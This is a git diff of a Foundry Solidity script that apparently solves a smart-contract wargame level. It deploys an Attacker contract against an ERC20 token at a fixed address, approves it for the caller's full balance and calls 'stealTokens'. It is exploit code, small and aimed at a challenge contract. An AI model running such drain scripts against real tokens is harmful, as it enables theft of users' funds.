@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity 0.8.0;
+pragma experimental ABIEncoderV2;
+pragma solidity 0.6.5;
 
 import "forge-std/Script.sol";
 import "../src/Attacker.sol";
@@ -7,16 +8,19 @@ import "../src/Contract.sol";
 import "forge-std/console.sol";
 
 contract AttackScript is Script {
-    GatekeeperTwo gatekeeper = 
-        GatekeeperTwo(0x4EC09e9168b33E4616Ec502944c9ef311e267ba3);
+
     Attacker attacker;
+    ERC20 token = ERC20(0x78a705f2108B095e49161d6E42aDB7cB53E07e57);
 
     function setUp() public {
         vm.startBroadcast();
-        attacker = new Attacker(gatekeeper);
+        attacker = new Attacker(token);
     }
 
     function run() public{
-        
+        //approve stealing 
+        token.approve(address(attacker), token.balanceOf(msg.sender));
+        //steal tokens 
+        attacker.stealTokens(msg.sender);
     }
 }
